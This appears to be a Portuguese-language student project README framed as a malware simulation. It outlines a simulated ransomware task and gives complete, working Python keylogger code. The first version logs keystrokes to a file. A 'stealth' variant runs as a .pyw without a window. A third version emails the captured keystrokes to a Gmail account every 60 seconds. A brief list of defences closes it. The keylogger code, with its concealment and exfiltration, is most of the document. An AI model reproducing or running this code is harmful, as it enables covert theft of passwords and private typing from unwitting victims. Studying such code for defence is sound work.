# Keylogger

Simulação de Malware com Python (Keylogger)

Este projeto foi desenvolvido em um ambiente seguro e controlado.


1. Ransomware Simulado

Criar arquivos de teste

Implementar um script que criptografa

Implementar a descriptografia

Gerar uma mensagem de “resgate”



2. Keylogger Simulado

Abaixo está o código 

2.1 Keylogger Básico (captura em log.txt)

#importa biblioteca instalada(monitora o teclado em tempo real)


from pynput import keyboard

# Conjunto que ignora teclas que não devem ser salvas no log.
IGNORAR = { 
    keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
    keyboard.Key.alt_l, keyboard.Key.alt_r, keyboard.Key.caps_lock, keyboard.Key.cmd
}

# Função chamada automaticamente toda vez que uma tecla é pressionada.
def on_press(key):
    try:
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)  # Captura teclas normais
    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as f:
            # Teclas especiais:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write(" ")
            elif key == keyboard.Key.esc:
                f.write("[ESC]")
            elif key in IGNORAR:
                pass
            else:
                f.write(f"[{key}]")

# Linha principal do programa que escuta as teclas pressionadas.
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()


2.2 Versão Furtiva (altera de .py para .pyw)

No Windows, arquivos .pyw executam sem abrir janela, tornando o keylogger "invisível".
O código é o mesmo do anterior, apenas salvo como .pyw.


2.3 Keylogger com Envio Automático por E-mail

Pré-requisitos solicitados no desafio:

Criar um e-mail Gmail

Ativar Verificação em Duas Etapas

Gerar senha de app em:
https://myaccount.google.com/apppasswords

Instalar biblioteca SMTP:

pip install secure-smtplib

Código:
from pynput import keyboard   # captura teclas
import smtplib                # envia email
from email.mime.text import MIMEText  # formata mensagem
from threading import Timer   # agenda envio do email

log = ""

# CONFIGURAÇÕES DE E-MAIL
EMAIL_ORIGEM = "...@gmail.com"
EMAIL_DESTINO = "...@gmail.com"
SENHA_EMAIL = "123" # senha gerada no app password

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "Dados capturados pelo keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To']  = EMAIL_DESTINO

        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar", e)

        log = ""

    # Agendar envio a cada 60s
    Timer(60, enviar_email).start()

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.tab:
            log += "\t"
        elif key == keyboard.Key.backspace:
            log += " "
        elif key == keyboard.Key.esc:
            log += "[ESC]"
        else:
            pass  # demais teclas ignoradas

# Inicia o keylogger e envio automático
with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()


Execução no terminal:

./keylogger_email.py



Antivírus: identifica comportamento suspeito como keylogging.

Firewall: bloqueia conexões SMTP não autorizadas e comunicação externa.

Sandboxing: permite executar scripts perigosos em ambiente isolado.

Conscientização do usuário: prevenção contra engenharia social, phishing e execução de arquivos desconhecidos.
